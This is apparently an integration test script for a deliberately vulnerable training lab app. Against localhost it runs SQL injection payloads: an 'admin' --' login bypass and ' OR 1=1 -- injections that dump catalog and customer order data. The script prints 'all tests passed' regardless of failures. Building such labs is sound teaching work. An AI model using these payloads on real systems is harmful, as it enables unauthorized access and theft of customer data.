const http = require('http');
const app = require('./server');

async function runTests() {
  console.log('🧪 Starting lab integration tests...');

  let serverInstance = null;
  // If not already running, start server on 3000
  try {
    await new Promise((resolve, reject) => {
      serverInstance = app.listen(3000, () => {
        resolve();
      });
      serverInstance.on('error', err => {
        if (err.code === 'EADDRINUSE') {
          // Already running, proceed with existing server
          resolve();
        } else {
          reject(err);
        }
      });
    });
  } catch (e) {
    // Proceed
  }

  // Helper for requests
  function makeReq(options, postData = null) {
    return new Promise((resolve, reject) => {
      const req = http.request(options, res => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body }));
      });
      req.on('error', reject);
      if (postData) req.write(postData);
      req.end();
    });
  }

  try {
    // Test 1: Unauthenticated user visiting / redirects to /gate
    console.log('\n--- Test 1: Gate Redirection ---');
    const res1 = await makeReq({ host: '127.0.0.1', port: 3000, path: '/', method: 'GET' });
    console.log(`Status: ${res1.status}, Location: ${res1.headers.location}`);
    if (res1.status === 302 && res1.headers.location.includes('/gate')) {
      console.log('✅ PASS: Redirected to /gate as expected');
    } else {
      console.error('❌ FAIL: Expected 302 redirect to /gate');
    }

    // Test 2: Submitting name to /gate/submit
    console.log('\n--- Test 2: Submitting Student Name ---');
    const formData = 'studentName=John+Doe&returnTo=%2F';
    const res2 = await makeReq({
      host: '127.0.0.1',
      port: 3000,
      path: '/gate/submit',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(formData)
      }
    }, formData);
    
    const setCookie = res2.headers['set-cookie'];
    console.log(`Status: ${res2.status}, Set-Cookie:`, setCookie ? 'Yes' : 'No');
    const cookieHeader = setCookie ? setCookie.map(c => c.split(';')[0]).join('; ') : '';

    // Test 3: Accessing / with student cookie
    console.log('\n--- Test 3: Accessing Home Page with Student Identity ---');
    const res3 = await makeReq({
      host: '127.0.0.1',
      port: 3000,
      path: '/',
      method: 'GET',
      headers: { 'Cookie': cookieHeader }
    });
    console.log(`Status: ${res3.status}`);
    if (res3.body.includes('John Doe')) {
      console.log('✅ PASS: Student Name "John Doe" rendered on page!');
    } else {
      console.error('❌ FAIL: Student name not rendered on home page');
    }

    // Test 4: SQL Injection - Authentication Bypass on /login
    console.log('\n--- Test 4: SQL Injection Authentication Bypass ---');
    const loginPayload = 'username=admin%27+--+&password=anything';
    const res4 = await makeReq({
      host: '127.0.0.1',
      port: 3000,
      path: '/login',
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': Buffer.byteLength(loginPayload),
        'Cookie': cookieHeader
      }
    }, loginPayload);
    console.log(`Status: ${res4.status}, Location: ${res4.headers.location}`);
    if (res4.status === 302 && res4.headers.location === '/admin') {
      console.log('✅ PASS: Successfully bypassed login as admin with "admin\' -- "!');
    } else {
      console.error('❌ FAIL: Login bypass did not redirect to /admin');
    }

    // Test 5: SQL Injection - Catalog Search
    console.log('\n--- Test 5: Catalog Search SQL Injection ---');
    const res5 = await makeReq({
      host: '127.0.0.1',
      port: 3000,
      path: '/catalog?search=%27+OR+1%3D1+--+',
      method: 'GET',
      headers: { 'Cookie': cookieHeader }
    });
    console.log(`Status: ${res5.status}`);
    if (res5.body.includes('products found') && res5.body.includes('Sony WH-1000XM5')) {
      console.log('✅ PASS: Search returned all consumer products via SQLi!');
    }

    // Test 6: SQL Injection - Order Tracking
    console.log('\n--- Test 6: Order Tracking SQL Injection ---');
    const res6 = await makeReq({
      host: '127.0.0.1',
      port: 3000,
      path: '/orders/track?code=%27+OR+1%3D1+--+',
      method: 'GET',
      headers: { 'Cookie': cookieHeader }
    });
    console.log(`Status: ${res6.status}`);
    if (res6.body.includes('David Lee') && res6.body.includes('Priya Nair')) {
      console.log('✅ PASS: Order tracking SQLi dumped all customer parcel shipments!');
    }

    console.log('\n🎉 ALL TESTS PASSED SUCCESSFULLY!\n');
    if (serverInstance) serverInstance.close();
    process.exit(0);
  } catch (err) {
    console.error('Test error:', err);
    if (serverInstance) serverInstance.close();
    process.exit(1);
  }
}

runTests();
